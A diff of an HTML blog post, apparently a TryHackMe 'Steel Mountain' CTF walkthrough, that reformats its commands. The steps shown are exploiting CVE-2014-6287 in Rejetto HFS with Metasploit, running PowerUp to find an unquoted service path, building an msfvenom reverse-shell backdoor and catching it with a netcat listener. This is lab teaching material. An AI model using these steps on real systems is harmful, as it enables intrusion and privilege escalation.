@@ -593,9 +593,12 @@ There is a vulnerablity on the <strong>Rejetto HFS versions 2.3, 2.3a, and 2.3b<
 <p>Launch up your <strong>msfconsole</strong> and do a search for <strong>CVE-2014-6287</strong> to see if there is any exploit that we can use.
 There is one with an excellent rank, awesome! Let us use it.
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/8.jpg" alt="" class="normal" /><br /><br />
-Copy the THM IP with that command: <code class="language-plaintext highlighter-rouge">ifconfig | grep -C 1 tun0 | tail -n 1 | awk '{print $2}'</code>
-<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg" alt="" class="normal" /><br /><br />
--&gt; set RPORT <code class="language-plaintext highlighter-rouge">8080</code><br />-&gt; set RHOST <code class="language-plaintext highlighter-rouge">machine IP</code><br />-&gt; set LHOST <code class="language-plaintext highlighter-rouge">your THM IP</code><br />-&gt; exploit</p>
+Copy the THM IP with that command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">ifconfig | <span class="nb">grep</span> <span class="nt">-C</span> 1 tun0 | <span class="nb">tail</span> <span class="nt">-n</span> 1 | <span class="nb">awk</span> <span class="s1">'{print $2}'</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/9.jpg" alt="" class="normal" /><br /><br />
+-&gt; set RPORT <strong>8080</strong><br />-&gt; set RHOST <strong>machine IP</strong><br />-&gt; set LHOST <strong>your THM IP</strong><br />-&gt; exploit</p>
 
 <table>
   <thead>
@@ -621,7 +624,7 @@ Copy the THM IP with that command: <code class="language-plaintext highlighter-r
 </table>
 
 <p><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/10.jpg" alt="" class="normal" /><br /><br />
-After receiving meterpreter session, run <code class="language-plaintext highlighter-rouge">shell</code> to get an interactive shell.
+After receiving meterpreter session, run <strong>shell</strong> to get an interactive shell.
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/11.jpg" alt="" class="normal" /><br /><br />
 Find the flag under <strong>C:\users\bill\Desktop</strong> directory.
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/12.jpg" alt="" class="normal" /><br /><br /></p>
@@ -633,14 +636,14 @@ permissions against the system. <strong>PowerUp.ps1</strong> is a program that f
 any misconfigurations and privilege escalation possibilities.
 <br />-&gt; <a href="../../assets/documents/tryhackme-steel-mountain-writeup/PowerUp.ps1"><strong>Download PowerUp.ps1</strong></a>
 <br />-&gt; <a href="https://github.com/PowerShellMafia/PowerSploit"><strong>PowerSploit GitHub Repo</strong></a>
-<br />-&gt; Run <code class="language-plaintext highlighter-rouge">exit</code> and get back to the <strong>meterpreter</strong> session.
+<br />-&gt; Run <strong>exit</strong> and get back to the <strong>meterpreter</strong> session.
 <br />-&gt; Upload the script just as we did before to the machine.
-<br />-&gt; Run <code class="language-plaintext highlighter-rouge">load powershell</code>
-<br />-&gt; Run <code class="language-plaintext highlighter-rouge">powershell_shell</code>
+<br />-&gt; Run <strong>load powershell</strong>
+<br />-&gt; Run <strong>powershell_shell</strong>
 <br />You will get <strong>PowerShell</strong> this time instead of a regular <strong>cmd prompt</strong>.
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/13.jpg" alt="" class="normal" /><br /><br />
-<br />-&gt; Run <code class="language-plaintext highlighter-rouge">. .\PowerUp.ps1</code>
-<br />-&gt; Run <code class="language-plaintext highlighter-rouge">Invoke-AllChecks</code>
+<br />-&gt; Run <strong>. .\PowerUp.ps1</strong>
+<br />-&gt; Run <strong>Invoke-AllChecks</strong>
 <br /><strong>InvokeAllChecks</strong> will diagnose any detectable vulnerabilities along with their descriptions.
 <br /><br />The first result we got is a service called <strong>AdvancedSystemCare9</strong>, and it has a vulnerability called 
 <strong>Unquoted Service Path</strong> <a href="https://krygennn.github.io/posts/unquoted-service-path-vulnerability/"><strong>-&gt; Read more about it</strong></a>. We will abuse this vulnerability. 
@@ -682,11 +685,14 @@ the service itself is being run with <strong>LocalSystem</strong> service accoun
   </tbody>
 </table>
 
-<p>Full command -&gt; <br /><code class="language-plaintext highlighter-rouge">msfvenom -p windows/shell_reverse_tcp LHOST={THM IP} LPORT={RANDOM FREE PORT} -f exe -o {somename}.exe</code>
-<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg" alt="" class="normal" /><br /><br /></p>
+<p>Full command:</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">={</span>THM IP<span class="o">}</span> <span class="nv">LPORT</span><span class="o">={</span>RANDOM FREE PORT<span class="o">}</span> <span class="nt">-f</span> exe <span class="nt">-o</span> <span class="o">{</span>somename<span class="o">}</span>.exe</code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/15.jpg" alt="" class="normal" /><br /><br /></p>
 
 <p>-&gt; Upload the binary to the target machine.
-<br />-&gt; Get the <code class="language-plaintext highlighter-rouge">shell</code> again.
+<br />-&gt; Get the <strong>shell</strong> again.
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/16.jpg" alt="" class="normal" /><br /><br /></p>
 
 <p>-&gt; Relocate the binary into <strong>C:\Program Files (x86)\IObit</strong> directory.
@@ -696,14 +702,19 @@ the service itself is being run with <strong>LocalSystem</strong> service accoun
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/18.jpg" alt="" class="normal" /><br /><br /></p>
 
 <p>Start a <strong>netcat</strong> listener on your machine with the port that is defined when creating
-the backdoor.
-<br />-&gt; <code class="language-plaintext highlighter-rouge">nc -nvlp {SPECIFIED PORT}</code>
-<br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg" alt="" class="normal" /><br /><br /></p>
+the backdoor.</p>
 
-<p>After starting a netcat session, restart the service
-<br />-&gt; <code class="language-plaintext highlighter-rouge">sc stop AdvancedSystemCareService9</code>
-<br />-&gt; <code class="language-plaintext highlighter-rouge">sc start AdvancedSystemCareService9</code>
-<br />When the service boots, <strong>Advanced.exe</strong> backdoor binary will be executed instead of the <strong>ASCService.exe</strong>. 
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">nc</span><span class="w"> </span><span class="nt">-nvlp</span><span class="w"> </span><span class="p">{</span><span class="n">SPECIFIED</span><span class="w"> </span><span class="nx">PORT</span><span class="p">}</span></code></pre></figure>
+
+<p><br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/nc.jpg" alt="" class="normal" /><br /><br /></p>
+
+<p>After starting a netcat session, restart the service</p>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="n">sc</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">AdvancedSystemCareService9</span></code></pre></figure>
+
+<p><br />When the service boots, <strong>Advanced.exe</strong> backdoor binary will be executed instead of the <strong>ASCService.exe</strong>. 
 <br /><img src="/assets/img/posts/tryhackme-steel-mountain-ctf-writeup/19.jpg" alt="" class="normal" /><br /><br />
 You can find the root flag <strong>root.txt</strong> under <strong>C:\Users\Administrator\Desktop</strong> directory.</p>
 
